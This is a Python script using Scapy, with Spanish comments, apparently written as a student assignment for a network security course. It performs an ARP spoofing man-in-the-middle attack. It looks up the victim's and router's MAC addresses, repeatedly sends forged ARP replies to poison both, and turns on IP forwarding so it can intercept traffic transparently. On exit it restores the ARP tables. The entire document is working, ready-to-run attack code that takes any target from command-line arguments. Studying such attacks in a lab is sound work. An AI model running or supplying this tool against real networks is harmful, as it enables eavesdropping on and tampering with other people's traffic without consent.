#!/usr/bin/env python3
# =============================================================================
# ARP Spoofing - Ataque Man in the Middle (MitM)
# =============================================================================
# Autor     : Junior Javier Santos Perez
# Matricula : 2024-1599
# Curso     : Seguridad en Redes
# Descripcion: Script que realiza un ataque MitM mediante ARP Spoofing.
#              Envenena las tablas ARP de la víctima y el router para
#              interceptar el tráfico entre ambos.
# Red       : 10.0.99.0/24
# Interfaz  : eth0
# =============================================================================

from scapy.all import Ether, ARP, sendp, srp, conf
import time
import sys
import os
import argparse

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURACION
# ─────────────────────────────────────────────────────────────────────────────
INTERFAZ      = "eth0"
IP_VICTIMA    = "10.0.99.50"
IP_ROUTER     = "10.0.99.1"
INTERVALO     = 2       # Segundos entre cada envío de paquetes ARP


# ─────────────────────────────────────────────────────────────────────────────
# FUNCION: Obtener la MAC de una IP
# ─────────────────────────────────────────────────────────────────────────────
def obtener_mac(ip, interfaz):
    """
    Envía un ARP Request para obtener la MAC de una IP.

    Parametros:
        ip       (str): IP objetivo.
        interfaz (str): Interfaz de red a usar.

    Retorna:
        str: Dirección MAC encontrada.
    """
    paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    respuesta, _ = srp(paquete, iface=interfaz, timeout=3, verbose=False)
    if respuesta:
        return respuesta[0][1].hwsrc
    else:
        print(f"[ERROR] No se pudo obtener la MAC de {ip}. Verifica que el host esté activo.")
        sys.exit(1)


# ─────────────────────────────────────────────────────────────────────────────
# FUNCION: Enviar paquete ARP falso
# ─────────────────────────────────────────────────────────────────────────────
def envenenar_arp(ip_objetivo, mac_objetivo, ip_falsa, interfaz):
    """
    Envía un ARP Reply falso al objetivo haciéndole creer que
    la IP falsa corresponde a la MAC del atacante.

    Parametros:
        ip_objetivo  (str): IP del host a envenenar.
        mac_objetivo (str): MAC real del host objetivo.
        ip_falsa     (str): IP que se va a suplantar.
        interfaz     (str): Interfaz de red a usar.
    """
    paquete = Ether(dst=mac_objetivo) / ARP(
        op=2,              # op=2 significa ARP Reply
        pdst=ip_objetivo,  # A quién va dirigido
        hwdst=mac_objetivo,# MAC destino (real)
        psrc=ip_falsa,     # IP que suplantamos
        # hwsrc se rellena automáticamente con la MAC del atacante
    )
    sendp(paquete, iface=interfaz, verbose=False)


# ─────────────────────────────────────────────────────────────────────────────
# FUNCION: Restaurar ARP (limpiar al finalizar)
# ─────────────────────────────────────────────────────────────────────────────
def restaurar_arp(ip_objetivo, mac_objetivo, ip_real, mac_real, interfaz):
    """
    Restaura las tablas ARP a su estado original enviando
    ARP Replies con los valores correctos.

    Parametros:
        ip_objetivo  (str): IP del host a restaurar.
        mac_objetivo (str): MAC real del host objetivo.
        ip_real      (str): IP real que fue suplantada.
        mac_real     (str): MAC real del host suplantado.
        interfaz     (str): Interfaz de red a usar.
    """
    paquete = Ether(dst=mac_objetivo) / ARP(
        op=2,
        pdst=ip_objetivo,
        hwdst=mac_objetivo,
        psrc=ip_real,
        hwsrc=mac_real
    )
    sendp(paquete, iface=interfaz, count=5, verbose=False)


# ─────────────────────────────────────────────────────────────────────────────
# FUNCION: Habilitar IP forwarding
# ─────────────────────────────────────────────────────────────────────────────
def habilitar_ip_forwarding():
    """
    Activa el reenvío de paquetes IP en Linux para que el tráfico
    interceptado llegue a su destino real (MitM transparente).
    """
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding activado.")


def deshabilitar_ip_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding desactivado.")


# ─────────────────────────────────────────────────────────────────────────────
# FUNCION: Ejecutar el ataque
# ─────────────────────────────────────────────────────────────────────────────
def ejecutar_ataque(ip_victima, ip_router, interfaz, intervalo):
    """
    Ejecuta el ataque ARP Spoofing en bucle, envenenando
    tanto a la víctima como al router simultaneamente.

    Parametros:
        ip_victima (str)  : IP de la víctima.
        ip_router  (str)  : IP del router/gateway.
        interfaz   (str)  : Interfaz de red a usar.
        intervalo  (float): Segundos entre cada envío.
    """
    conf.verb = 0

    print("=" * 60)
    print("   ARP SPOOFING - MitM ATTACK")
    print("   Autor    : Junior Javier Santos Perez")
    print("   Matricula: 2024-1599")
    print("=" * 60)
    print(f"[*] Interfaz  : {interfaz}")
    print(f"[*] Víctima   : {ip_victima}")
    print(f"[*] Router    : {ip_router}")
    print(f"[*] Intervalo : {intervalo}s")
    print("=" * 60)

    # Obtener MACs reales
    print(f"[*] Obteniendo MAC de la víctima ({ip_victima})...")
    mac_victima = obtener_mac(ip_victima, interfaz)
    print(f"[+] MAC Víctima : {mac_victima}")

    print(f"[*] Obteniendo MAC del router ({ip_router})...")
    mac_router = obtener_mac(ip_router, interfaz)
    print(f"[+] MAC Router  : {mac_router}")

    print("=" * 60)
    print("[*] Iniciando envenenamiento ARP... Presiona Ctrl+C para detener.\n")

    habilitar_ip_forwarding()

    paquetes_enviados = 0

    try:
        while True:
            # Envenenar a la víctima: le decimos que el router es el atacante
            envenenar_arp(ip_victima, mac_victima, ip_router, interfaz)

            # Envenenar al router: le decimos que la víctima es el atacante
            envenenar_arp(ip_router, mac_router, ip_victima, interfaz)

            paquetes_enviados += 2
            print(f"[+] Paquetes ARP enviados: {paquetes_enviados} | "
                  f"Víctima: {ip_victima} | Router: {ip_router}")

            time.sleep(intervalo)

    except KeyboardInterrupt:
        print(f"\n[!] Ataque detenido. Restaurando tablas ARP...")
        restaurar_arp(ip_victima, mac_victima, ip_router, mac_router, interfaz)
        restaurar_arp(ip_router, mac_router, ip_victima, mac_victima, interfaz)
        deshabilitar_ip_forwarding()
        print("[*] Tablas ARP restauradas correctamente.")
        print("=" * 60)
        print(f"[*] Total paquetes enviados: {paquetes_enviados}")
        print("[*] Ataque finalizado.")
        print("=" * 60)


# ─────────────────────────────────────────────────────────────────────────────
# PUNTO DE ENTRADA
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="ARP Spoofing MitM - Junior Javier Santos Perez (2024-1599)"
    )
    parser.add_argument("-i", "--interfaz",  default=INTERFAZ)
    parser.add_argument("-v", "--victima",   default=IP_VICTIMA)
    parser.add_argument("-r", "--router",    default=IP_ROUTER)
    parser.add_argument("-t", "--intervalo", type=float, default=INTERVALO)
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[ERROR] Ejecuta con sudo.")
        sys.exit(1)

    ejecutar_ataque(args.victima, args.router, args.interfaz, args.intervalo)


if __name__ == "__main__":
    main()
